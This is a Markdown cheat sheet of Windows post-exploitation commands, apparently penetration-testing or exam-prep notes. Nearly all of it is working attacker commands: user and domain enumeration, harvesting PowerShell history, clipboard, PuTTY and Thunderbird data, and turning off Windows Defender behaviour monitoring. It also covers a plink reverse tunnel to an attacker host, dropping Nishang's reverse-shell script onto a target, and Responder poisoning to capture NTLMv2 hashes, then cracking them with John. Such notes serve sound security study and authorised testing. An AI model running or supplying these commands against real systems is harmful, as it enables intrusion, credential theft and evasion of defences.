# Windows Enumeration

- [Windows Enumeration](#windows-enumeration)
	- [Usefull Command - MSF](#usefull-command---msf)
	- [Usefull Command - Windows](#usefull-command---windows)
	- [Switch user](#switch-user)
		- [Powershell](#powershell)
		- [Tool](#tool)
	- [Powershell history](#powershell-history)
	- [Clipboard](#clipboard)
	- [AV](#av)
		- [Windows Defender](#windows-defender)
	- [Firewall](#firewall)
	- [Network](#network)
	- [Software](#software)
	- [Service only available from inside](#service-only-available-from-inside)
	- [SNMP Paramters](#snmp-paramters)
	- [Thunderbird](#thunderbird)
	- [Putty](#putty)
	- [Nishang](#nishang)
	- [Responder - LLMNR & NBT-NS Poisoning](#responder---llmnr--nbt-ns-poisoning)
	- [Source](#source)
		- [Powershell module](#powershell-module)
		- [Other](#other)

## Usefull Command - MSF

```cmd
sysinfo
getuid
run post/windows/gather/win_privs
```

## Usefull Command - Windows

```cmd
systeminfo  
wmic qfe get Caption,Description,HotFixID,InstalledOn  

whoami  
whoami /all
echo %USERNAME%  

net user  
net localgroup  

net user /domain  

net group /domain  
net group /domain <Group Name>  
```

## Switch user

### Powershell

```powershell
$username='Admin'
$password='Password123'
$securePassword=(ConvertTo-SecureString $password -AsPlainText -Force)
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Enter-PSSession -ComputerName localhost -Credential $credential
```

> Elevate cmd

```powershell
runas /user:admin cmd
powershell -Command "Start-Process cmd -Verb RunAs"
```

### Tool

```powershell
wincat.exe IP_ADDRESS PORT -u USERNAME -p PASSWORD
```

## Powershell history

```powershell
type C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type %appdata%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

cat (Get-PSReadlineOption).HistorySavePath
```

## Clipboard

```powershell
powershell -command "Get-Clipboard"
```

## AV

AntiVirus Product:

```powershell
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more 
```

### Windows Defender

Status of defender :

```powershell
sc query windefend
```

Disable defender:

```powershell
Set-MpPreference -DisableBehaviorMonitoring $true
```

Enable  defender:

```powershell
Set-MpPreference -DisableBehaviorMonitoring $false
```

Exclusions:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s
```

## Firewall

```cmd
netsh firewall show state  
netsh firewall show config  
```

## Network

```cmd
ipconfig /all  
route print  
arp -A  
```

## Software

```powershell
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

## Service only available from inside

```powershell
netstat -ano  
upload plink.exe  

plink.exe -R "remote port":127.0.0.1:"local port"  root@"ipaddress"
```

## SNMP Paramters

```powershell
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  
```

## Thunderbird

User mailbox: `C:\Users\%username%\AppData\Roaming\Thunderbird\Profiles\RAND.default-release\Mail\mail.DOMAIN\Inbox`

## Putty

```powershell
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"  
```

## Nishang

Pentest tools and script (Backdoor/Bypass/PrivEscal/MITM/Pivot/Scan/InfoGather)
(<https://github.com/samratashok/nishang.git>)

Drop this **Directory** to the target computer

```text
/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
```

## Responder - LLMNR & NBT-NS Poisoning

To listen

```bash
responder -i ens33 -f 
```

Path of the hash

```bash
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-IP_ADDRESS.txt
```

Crack the hash

```bash
john /usr/share/responder/logs/SMB-NTLMv2-SSP-IP_ADDRESS.txt --format=netntlmv2 --wordlist=rockyou.txt
```

## Source

### Powershell module

- <https://github.com/samratashok/nishang>
- <https://github.com/PowerShellMafia/PowerSploit>
- <https://github.com/EmpireProject/Empire/tree/master/data/module_source/credentialsource>

### Other

- <https://raw.githubusercontent.com/xMilkPowderx/OSCP/master/Windows%20Priv%20Esc.md>
- <https://0xsp.com/ad-attack-or-defense/ad-ttps-list>
- <https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens>
- <https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges>
